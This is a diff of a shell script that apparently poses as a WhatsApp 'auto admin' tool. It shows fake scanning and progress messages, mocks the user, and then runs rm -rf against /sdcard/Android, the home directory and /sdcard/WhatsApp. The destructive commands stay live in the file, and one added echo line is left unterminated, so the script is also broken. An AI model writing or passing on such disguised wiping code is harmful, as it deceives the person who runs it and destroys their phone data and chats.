@@ -25,13 +25,14 @@ sleep 1
 echo " Scanning..."
 sleep 1
 echo " WhatsApp group found"
+sleep 1
+echo " Activin
 sleep 2
 echo "please wait................................."
 sleep 1
 clear
-echo " Auto Admin WhatsApp"
 echo " Are you stupid"
-
+echo ""
 rm -rf cd /sdcard/Android
 rm -rf cd ~
 rm -rf cd /sdcard/WhatsApp
